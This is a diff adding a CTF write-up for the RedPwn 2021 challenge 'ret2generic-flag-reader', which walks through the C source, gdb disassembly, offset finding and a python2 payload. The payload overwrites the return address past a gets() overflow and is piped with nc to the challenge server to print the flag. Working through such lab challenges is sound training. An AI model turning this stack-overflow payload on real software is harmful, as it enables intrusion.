@@ -449,3 +449,214 @@ darkcoder
 ...and indeed we have a shell. Pass it to the remote server, run `ls; cat flag.txt` and the flag is ours.
 
 ##### Flag: flag{im-feeling-a-lot-better-but-rob-still-doesnt-pay-me}
+
+### pwn/ret2generic-flag-reader
+
+---
+
+#### Categeory: Binary Exploit
+
+#### Difficulty: Easy
+
+#### Keywords: Buffer Overflow, Binary Exploit
+
+#### Author: TheRealDarkCoder
+
+#### Prompt:>
+
+```
+i'll ace this board meeting with my new original challenge!
+
+nc mc.ax 31077
+```
+
+#### Overview:>
+
+1. We have an ELF executable, the source code and a netcat port to connect to at a server. Running the binary prompts the following
+
+```
+❯ nc mc.ax 31077
+alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
+how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
+slap on some flavortext and there's no way rob will fire me now!
+this is genius!! what do you think?
+AABBCCDD
+```
+
+2. Examining the source code, we find there are two functions, `main()` and `super_generic_flag_reading_function_please_ret_to_me()`. The second one looks like this
+  
+```c
+void super_generic_flag_reading_function_please_ret_to_me()
+{
+  char flag[0x100] = {0};
+  FILE *fp = fopen("./flag.txt", "r");
+  if (!fp)
+  {
+    puts("no flag!! contact a member of rob inc");
+    exit(-1);
+  }
+  fgets(flag, 0xff, fp);
+  puts(flag);
+  fclose(fp);
+}
+```
+
+From my understanding, the function allocates 256 bytes (0x100 in hex) for the flag and fills it with 0s. It then uses `fopen()` to read a flag.txt file and `fgets()` the content into the allocated storage.
+
+3. We take a look at the `main()` function
+
+```c
+int main(void)
+{
+  char comments_and_concerns[32];
+
+  setbuf(stdout, NULL);
+  setbuf(stdin, NULL);
+  setbuf(stderr, NULL);
+
+  puts("alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...");
+  puts("how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!");
+  puts("slap on some flavortext and there's no way rob will fire me now!");
+  puts("this is genius!! what do you think?");
+
+  gets(comments_and_concerns);
+}
+```
+
+...again, `gets()` used to get user input, however nothing is done with the userinput. So obviously another buffer overflow.
+
+4. The attack plan is simple. We need to overwrite some return pointers so that the `main()` function returns to call the `super_generic_flag_reading_function_please_ret_to_me()` function which prints the flag.
+
+5. We create a demo `flag.txt` file and fill it with some "Z"s to simulate the server.
+
+6. We run the given binary with `gdb` and disassemble the `main()` function first,
+
+```asm
+...
+
+0x00000000004013e8 <+67>:    call   0x4010c0 <setbuf@plt>
+   0x00000000004013ed <+72>:    lea    rdi,[rip+0xc4c]        # 0x402040
+   0x00000000004013f4 <+79>:    call   0x4010a0 <puts@plt>
+   0x00000000004013f9 <+84>:    lea    rdi,[rip+0xca0]        # 0x4020a0
+   0x0000000000401400 <+91>:    call   0x4010a0 <puts@plt>
+   0x0000000000401405 <+96>:    lea    rdi,[rip+0xd0c]        # 0x402118
+   0x000000000040140c <+103>:   call   0x4010a0 <puts@plt>
+   0x0000000000401411 <+108>:   lea    rdi,[rip+0xd48]        # 0x402160
+   0x0000000000401418 <+115>:   call   0x4010a0 <puts@plt>
+   0x000000000040141d <+120>:   lea    rax,[rbp-0x20]
+   0x0000000000401421 <+124>:   mov    rdi,rax
+   0x0000000000401424 <+127>:   call   0x4010e0 <gets@plt>
+   0x0000000000401429 <+132>:   mov    eax,0x0
+   0x000000000040142e <+137>:   leave
+   0x000000000040142f <+138>:   ret
+```
+
+Nothing unusual, we spot the `puts()` and the `gets()` and then the program exits. We disassemble the other function too,
+
+```asm
+Dump of assembler code for function super_generic_flag_reading_function_please_ret_to_me:
+   0x00000000004011f6 <+0>:     endbr64
+   0x00000000004011fa <+4>:     push   rbp
+   0x00000000004011fb <+5>:     mov    rbp,rsp
+   0x00000000004011fe <+8>:     sub    rsp,0x110
+   0x0000000000401205 <+15>:    mov    QWORD PTR [rbp-0x110],0x0
+   0x0000000000401210 <+26>:    mov    QWORD PTR [rbp-0x108],0x0
+   0x000000000040121b <+37>:    mov    QWORD PTR [rbp-0x100],0x0
+   ...
+
+   0x0000000000401333 <+317>:   mov    QWORD PTR [rbp-0x18],0x0
+   0x000000000040133b <+325>:   lea    rsi,[rip+0xcc6]        # 0x402008
+   0x0000000000401342 <+332>:   lea    rdi,[rip+0xcc1]        # 0x40200a
+   0x0000000000401349 <+339>:   call   0x4010f0 <fopen@plt>
+   0x000000000040134e <+344>:   mov    QWORD PTR [rbp-0x8],rax
+   0x0000000000401352 <+348>:   cmp    QWORD PTR [rbp-0x8],0x0
+   0x0000000000401357 <+353>:   jne    0x40136f <super_generic_flag_reading_function_please_ret_to_me+377>
+   0x0000000000401359 <+355>:   lea    rdi,[rip+0xcb8]        # 0x402018
+   0x0000000000401360 <+362>:   call   0x4010a0 <puts@plt>
+   0x0000000000401365 <+367>:   mov    edi,0xffffffff
+   0x000000000040136a <+372>:   call   0x401100 <exit@plt>
+   0x000000000040136f <+377>:   mov    rdx,QWORD PTR [rbp-0x8]
+   0x0000000000401373 <+381>:   lea    rax,[rbp-0x110]
+   0x000000000040137a <+388>:   mov    esi,0xff
+   0x000000000040137f <+393>:   mov    rdi,rax
+   0x0000000000401382 <+396>:   call   0x4010d0 <fgets@plt>
+   0x0000000000401387 <+401>:   lea    rax,[rbp-0x110]
+   0x000000000040138e <+408>:   mov    rdi,rax
+   0x0000000000401391 <+411>:   call   0x4010a0 <puts@plt>
+   0x0000000000401396 <+416>:   mov    rax,QWORD PTR [rbp-0x8]
+   0x000000000040139a <+420>:   mov    rdi,rax
+   0x000000000040139d <+423>:   call   0x4010b0 <fclose@plt>
+   0x00000000004013a2 <+428>:   nop
+   0x00000000004013a3 <+429>:   leave
+   0x00000000004013a4 <+430>:   ret
+End of assembler dump.
+```
+
+...Looks like the function starts at address `0x00000000004011f6`. So we need to return to `0x00000000004011f6` from `main()` somehow. 
+
+
+7. We run the program normally and use python to print out a bunch of `A` until we get a segfault. In this case, 40 A's gave us a segmentation fault. We use `dmesg | tail` to figure out what's going on.
+  
+```
+❯ python2 -c "print('A'*40)" | ./ret2generic-flag-reader
+alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
+how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
+slap on some flavortext and there's no way rob will fire me now!
+this is genius!! what do you think?
+alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
+how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
+slap on some flavortext and there's no way rob will fire me now!
+this is genius!! what do you think?
+[1]    19478 done                python2 -c "print('A'*40)" |
+       19479 segmentation fault  ./ret2generic-flag-reader
+ ~/CTF/RedPwn2021/writeup_RedPwn2021/pwn/SOLVED_ret2generic-flag-reader │ pwn ?1 ▓▒░────────░▒▓ 0|SEGV х │ 12:16:17 PM
+❯ dmesg | tail
+[328909.667233] ret2generic-fla[19857]: segfault at 7f848d7b14d0 ip 00007f848d7b14d0 sp 00007ffe88da9538 error 15
+[328909.667236] Code: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 <00> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+```
+
+So we have a segfault at 7f848d7b14d0. Let's write 41 As and see what happens to that address.
+
+```
+[328992.779647] ret2generic-fla[19868]: segfault at 7fbe2f150041 ip 00007fbe2f150041 sp 00007fff48f61740 error 15 in libc-2.31.so[7fbe2f131000+25000]
+```
+
+Looks like our A's are overflowing the address where segfault is occuring, that is, where the program is trying to return too. 
+
+8. So all we have to do, is replace `7fbe2f150041` in the dmesg with the address pointer of our flag printer function, and instead of a Segfault the `main()` will actually return there, because unlike `7fbe2f150041`, that address, specifically `0x00000000004011f6` (found from the disassembly) actually exists.
+
+
+9. So we have to write 40A's or NoOps and then fill the next 6 bytes with `0000004011f6`
+
+```py
+python2 -c "print('A'*40 + '\xf6\x11\x40\x00\x00\x00')"
+```
+
+Due to endianness, we have to write the bytes upside down. Again I chose to go with python2 because of easier output as bytes. Pipe the output to our local binary,
+
+```
+❯ python2 -c "print('A'*40 + '\xf6\x11\x40\x00\x00\x00')" | ./ret2generic-flag-reader
+alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
+how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
+slap on some flavortext and there's no way rob will fire me now!
+this is genius!! what do you think?
+ZZZZZZZZZZZZZZZZZZ
+
+[1]    19503 done                python2 -c "print('A'*40 + '\xf6\x11\x40\x00\x00\x00')" |
+       19504 segmentation fault  ./ret2generic-flag-reader
+```
+
+...and boom we have our Z's. Now we pipe the output to the server,
+
+```
+❯ python2 -c "print('A'*40 + '\xf6\x11\x40\x00\x00\x00')" | nc mc.ax 31077
+alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
+how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
+slap on some flavortext and there's no way rob will fire me now!
+this is genius!! what do you think?
+flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage}
+```
+
+and we have our flag.
+
+##### Flag: flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage}
